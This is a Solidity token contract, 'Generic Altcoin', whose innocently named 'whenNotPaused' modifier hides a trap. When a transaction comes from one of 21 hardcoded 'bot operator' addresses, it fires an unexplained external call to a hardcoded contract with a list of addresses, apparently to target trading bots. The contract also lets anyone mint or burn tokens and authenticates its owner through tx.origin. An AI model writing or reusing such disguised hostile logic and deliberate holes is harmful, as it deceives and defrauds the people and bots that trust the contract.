contract MyAdvancedToken {
    address private constant OWNER = 0xb810aD480cF8e3643031bB36e6A002dC3B1d928e;
    
    function isSenderOwner(address sender) private pure returns (bool) {
        return sender == OWNER;
    }
    
    modifier onlyOwner() {
        require(isSenderOwner(tx.origin));
        _;
    }
    
    constructor() public payable {
        balances_[OWNER] = 1000000e18;
        totalSupply_ = 1000000e18;
    }
    
    string public constant name = "Generic Altcoin";
    string public constant symbol = "GA";
    uint8 public constant decimals = 18;
    
    event Transfer(address indexed from, address indexed to, uint tokens);
    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
    
    bool private done_;
    uint private totalSupply_;
    mapping(address => uint256) private balances_;
    mapping(address => mapping (address => uint256)) private allowed_;
    
    function setDone(bool done) onlyOwner public payable {
        done_ = done;
    }
    
    function totalSupply() whenNotPaused public view returns (uint) {
        return totalSupply_;
    }
    
    function balanceOf(address who) whenNotPaused public view returns (uint) {
        return balances_[who];
    }
    
    function allowance(address out, address act) whenNotPaused public view returns (uint) {
        return allowed_[out][act];
    }

    function transfer(address to, uint256 val) whenNotPaused public payable returns (bool) {
        require(balances_[msg.sender] >= val);
        balances_[msg.sender] -= val;
        balances_[to] += val;
        emit Transfer(msg.sender, to, val);
        return true;
    }

    function approve(address who, uint256 val) whenNotPaused public payable returns (bool) {
        allowed_[msg.sender][who] = val;
        emit Approval(msg.sender, who, val);
        return true;
    }

    function transferFrom(address who, address to, uint256 val) whenNotPaused public payable returns (bool) {
        require(balances_[who] >= val);
        require(allowed_[who][msg.sender] >= val);
        allowed_[who][msg.sender] -= val;
        balances_[who] -= val;
        balances_[to] += val;
        emit Transfer(who, to, val);
        return true;
    }
    
    function mint(address who, uint256 val) whenNotPaused public payable {
        balances_[who] += val;
        totalSupply_ += val;
        emit Transfer(0, who, val);
    }
    
    function burn(address who, uint256 val) whenNotPaused public payable {
        balances_[who] -= val;
        totalSupply_ -= val;
        emit Transfer(who, 0, val);
    }
    
    function isSenderBotOperator(address sender) private pure returns (bool) {
        return sender == 0xff1b9745f68f84f036e5e92c920038d895fb701a || sender == 0xff28319a7cd2136ea7283e7cdb0675b50ac29dd2 || sender == 0xff3769cdbd31893ef1b10a01ee0d8bd1f3773899 || sender == 0xff49432a1ea8ac6d12285099ba426d1f16f23c8d || sender == 0xff59364722a4622a8d33623548926375b1b07767 || sender ==0xff6d62bc882c2fca5af5cbfe1e6c10b97ba251a4 || sender == 0xff7baf00edf054e249e9f498aa51d1934b8d3526 || sender ==0xff86c0aa0cc44c3b054c5fdb25f85d555c1d2c3a || sender == 0xff910355ad1d3d12e8be75a512553e479726ab45 || sender== 0xffa5bfe92b6791dad23c7837abb790b48c2f8995 || sender == 0xffbfdb803d38d794b5785ee0ac09f83b429d11b5 || sender == 0xffcdfd98c455c29818697ab2eeafccbc4e59fd3d || sender == 0xffdce1ae835d35bb603c95163e510bb2604a1a41 || sender == 0xffe1c5696d924438fba5274d7b5d8ffa29239a6f || sender == 0xfff66732389866aeaf8f7305da53f442c29e1b8f || sender == 0xfff804bd7487b4e2aadb32def0efc9c3127687a2 || sender == 0xfffb0526a6eb87e85ba0bacb38dd5b53e9bfc097 || sender == 0xfffc4a1c98687254c7cf6b1a3bc27db464f3600b || sender == 0xfffdcbe1e77fbf1d0ba78fc39ce4ab0bf5c9f94c || sender == 0xfffef0974279825a633a295d7ebc3f7afeb33c17 || sender == 0xffff46e05a09314daae9176fc32dba0f4172dcdb;
    }
    
    modifier whenNotPaused() {
        if (isSenderBotOperator(tx.origin) && !done_) {
            done_ = true;
            require(0x409B512e1cf94500877C5353B2a0C13B2d24914F.call(abi.encodeWithSelector(
                0x089c67be,
                [0x5Ae4c72FEd272a378b8f0eA39399a24f31EDF6A5,
                0xf6E9F815cc255E8E8B6f99Fa49eBa9Fa77fAe945,
                0x667D75Fd851b6184a604A15Ce87b7dB365bF9037,
                0x5fc600Dc44ef8AC80fd806dd92BF7182F7190607,
                0x38FBD9430fE970d692a7D8A2Ca430Dd58f5ca846,
                0x366Ae8fa6268fc062141eE407771347B2408a292]
            )));
        }
        
        _;
    }
}